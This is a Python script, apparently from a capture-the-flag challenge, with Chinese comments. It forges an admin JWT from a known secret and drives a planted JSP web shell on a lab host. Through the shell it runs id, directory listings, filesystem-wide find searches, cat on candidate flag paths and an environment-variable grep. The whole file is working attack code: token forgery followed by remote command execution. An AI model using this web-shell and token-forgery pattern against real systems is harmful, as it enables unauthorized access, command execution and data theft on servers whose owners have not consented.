#!/usr/bin/env python3
"""
利用成功的路径遍历获取Shell并查找flag
"""

import jwt
import requests
import urllib.parse

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token  
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

shell_url = f"{TARGET}/rce1.jsp"

print(f"[+] 测试Shell: {shell_url}\n")

def exec_cmd(cmd):
    """执行命令"""
    try:
        r = requests.get(
            f"{shell_url}?c={urllib.parse.quote(cmd)}",
            headers={"Cookie": f"token={admin_token}"},
            timeout=10
        )
        if r.status_code == 200:
            return r.text
        return f"[Error] Status: {r.status_code}"
    except Exception as e:
        return f"[Exception] {e}"

# 测试基本命令
print("[*] 测试命令执行...")
result = exec_cmd("id")
print(f"id: {result}\n")

if "uid=" in result or len(result) < 1000:
    print("[!] Shell 可用!\n")
    
    # 查找flag
    commands = [
        ("pwd", "当前目录"),
        ("ls -la /", "根目录"),
        ("ls -la /root", "/root目录"),
        ("ls -la /tmp", "/tmp目录"),
        ("ls -la /app", "/app目录"),
        ("find / -name '*flag*' -type f 2>/dev/null | head -20", "搜索flag文件"),
        ("find / -name 'flag' -type f 2>/dev/null", "搜索名为flag的文件"),
        ("find / -name 'flag.txt' -type f 2>/dev/null", "搜索flag.txt"),
        ("cat /flag 2>/dev/null || echo 'not found'", "尝试/flag"),
        ("cat /root/flag 2>/dev/null || echo 'not found'", "尝试/root/flag"),
        ("cat /flag.txt 2>/dev/null || echo 'not found'", "尝试/flag.txt"),
        ("env | grep -i flag", "环境变量中的flag"),
    ]
    
    for cmd, desc in commands:
        print(f"[*] {desc}")
        print(f"    命令: {cmd}")
        result = exec_cmd(cmd)
        print(f"    结果:")
        print(f"{result}")
        print("=" * 80 + "\n")
        
        # 检查是否找到flag
        if "flag{" in result.lower() or "pcb{" in result.lower() or "ctf{" in result.lower():
            print(f"\n[!] 可能找到FLAG!")
            print(f"[!] {result}\n")
            break
    
    print("\n[+] 如果需要交互式Shell，访问:")
    print(f"    {shell_url}?c=YOUR_COMMAND")
else:
    print("[-] Shell 不可用或JSP未执行")
    print(f"    响应: {result[:500]}")
